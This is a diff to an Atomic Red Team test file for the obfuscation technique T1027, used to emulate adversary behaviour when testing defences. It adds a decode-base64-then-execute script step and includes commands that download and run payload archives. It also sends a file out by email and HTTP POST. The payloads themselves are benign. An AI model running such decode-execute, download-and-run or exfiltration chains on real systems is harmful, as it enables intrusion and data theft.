@@ -21,12 +21,43 @@ atomic_tests:
   - description: |
       encode the command into base64 file
     prereq_command: |
-      exit 1
+      if [ -e "/tmp/encoded.dat" ]; then exit 0; else exit 1; fi
     get_prereq_command: |
       echo "#{shell_command}" | base64 > /tmp/encoded.dat
   executor:
     command: |
       cat /tmp/encoded.dat | base64 -d > /tmp/art.sh
+      chmod +x /tmp/art.sh
+      /tmp/art.sh
+    cleanup_command: |
+      rm /tmp/encoded.dat 
+      rm /tmp/art.sh
+    name: sh
+- name: Decode base64 Data into Script
+  auto_generated_guid: 197ed693-08e6-4958-bfd8-5974e291be6c
+  description: |
+    Creates a base64-encoded data file and decodes it into an executable shell script
+
+    Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team` 
+    and uname -v
+  supported_platforms:
+  - linux
+  input_arguments:
+    shell_command:
+      description: command to encode
+      type: string
+      default: "echo Hello from the Atomic Red Team && uname -v"
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      encode the command into base64 file
+    prereq_command: |
+      exit 1
+    get_prereq_command: |
+      echo "#{shell_command}" | b64encode -r - > /tmp/encoded.dat
+  executor:
+    command: |
+      cat /tmp/encoded.dat | b64decode -r > /tmp/art.sh
       chmod +x /tmp/art.sh
       /tmp/art.sh
     cleanup_command: |
@@ -103,7 +134,7 @@ atomic_tests:
   - description: |
       T1027.exe must exist on disk at PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe
     prereq_command: |
-      if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe) {exit 0} else {exit 1}
+      if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe") {exit 0} else {exit 1}
     get_prereq_command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
@@ -111,11 +142,10 @@ atomic_tests:
       Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\T1027.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\" -Force
   executor:
     command: |
-      "%temp%\temp_T1027.zip\T1027.exe"
+      "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe"
     cleanup_command: |
       taskkill /f /im calculator.exe >nul 2>nul
-      rmdir /S /Q %temp%\temp_T1027.zip >nul 2>nul
-      del /Q "%temp%\T1027.zip" >nul 2>nul
+      taskkill /f /im CalculatorApp.exe >nul 2>nul
     name: command_prompt
 - name: DLP Evasion via Sensitive Data in VBA Macro over email
   auto_generated_guid: 129edb75-d7b8-42cd-a8ba-1f3db64ec4ad
@@ -143,7 +173,7 @@ atomic_tests:
       default: 127.0.0.1
   executor:
     command: |
-      Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments #{input_file} -SmtpServer #{smtp_server}
+      Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments "#{input_file}" -SmtpServer #{smtp_server}
     name: powershell
 - name: DLP Evasion via Sensitive Data in VBA Macro over HTTP
   auto_generated_guid: e2d85e66-cb66-4ed7-93b1-833fc56c9319
@@ -163,7 +193,7 @@ atomic_tests:
       default: 127.0.0.1
   executor:
     command: |
-      Invoke-WebRequest -Uri #{ip_address} -Method POST -Body #{input_file}
+      Invoke-WebRequest -Uri #{ip_address} -Method POST -Body "#{input_file}"
     name: powershell
 - name: Obfuscated Command in PowerShell
   auto_generated_guid: 8b3f4ed6-077b-4bdd-891c-2d237f19410f
@@ -227,20 +257,21 @@ atomic_tests:
     url_path:
       description: url to download JScript file
       type: url
-      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027js.zip
+      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/t1027js.zip
   dependency_executor_name: powershell
   dependencies:
   - description: |
       T1027.js must exist on disk at PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js
     prereq_command: |
-      if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js) {exit 0} else {exit 1}
+      if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js") {exit 0} else {exit 1}
     get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       Invoke-WebRequest "#{url_path}" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\T1027js.zip"
       Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\T1027js.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\" -Force
   executor:
     command: |
-      "%temp%\temp_T1027js.zip\T1027js.js"
+      "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js"
     cleanup_command: |
       taskkill /f /im calculator.exe >nul 2>nul
     name: command_prompt
